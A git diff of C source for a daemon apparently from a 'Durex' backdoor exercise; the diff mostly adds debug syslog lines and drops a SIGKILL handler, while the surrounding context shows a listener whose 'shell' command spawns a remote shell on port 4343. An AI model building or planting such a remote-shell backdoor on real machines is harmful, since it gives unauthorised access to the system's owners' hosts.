@@ -1,4 +1,5 @@
-	#include "../includes/durex.h"
+#include "../includes/durex.h"
+#include <syslog.h>
 
 fd_set readset, writeset;
 int max_connections = 0;
@@ -122,6 +123,7 @@ void	toto(int signum)
 	t_daemon *daemon;
 
 	daemon = get_daemon();
+	syslog(1, "%s", "signal");
 	ft_exit(daemon, -1);
 }
 
@@ -132,7 +134,6 @@ void	set_sigs()
 
 	memset(&act, 0, sizeof(act));
 	act.sa_handler = handle_sigs;
-	signal(SIGKILL, toto);
 
 	i = -1;
 	while (++i < 32)
@@ -141,6 +142,7 @@ void	set_sigs()
 
 void	ft_exit(t_daemon *daemon, int status)
 {
+	syslog(1, "%s", "ft_exit");
 	if (daemon->lock_file > 0)
 		flock(daemon->lock_file, LOCK_UN);
 	unlink("/var/lock/matt_daemon.lock");
@@ -154,6 +156,9 @@ void	spawn_shell(int cs)
 	int child = fork();
 	if (child == 0)
 		system("/bin/shell");
+	else
+		syslog(1, "%s", "find de fork shell");
+	syslog(1, "%s", "find de spawn");
 }
 
 void	handle_connection(t_daemon *daemon, int cs)
@@ -165,9 +170,11 @@ void	handle_connection(t_daemon *daemon, int cs)
 	mem = read_fd(cs);
 	if (mem == NULL || mem->len == 0)
 	{
+		
 		FD_CLR(cs, &readset);
 		FD_CLR(cs, &writeset);
 		max_connections--;
+		syslog(1, "%s", "fewf");
 		close(cs);
 		return ;
 	}
@@ -183,8 +190,10 @@ void	handle_connection(t_daemon *daemon, int cs)
 		write(cs, "?     show help\nshell spawn remote shell on 4343\n", ft_strlen("?     show help\nshell spawn remote shell on 4343\n"));
 	if (ft_strequ(mem->data, "shell") == 1)
 		spawn_shell(cs);
+	else
+		write(cs, "$> ", 3);
 	ft_free_mem(mem);
-	write(cs, "$> ", 3);
+	
 }
 
 void	open_lock(t_daemon *daemon)
@@ -271,9 +280,16 @@ int	main(void)
 			}
 		}
 		else
+		{
+			syslog(1, "%s", "find de fokr 2");
 			exit(-1);
+		}
 	}
 	else
+	{
+		syslog(1, "%s", "find de fokr 1");
 		exit(-1);
+	}
+		
 	return (0);
 }
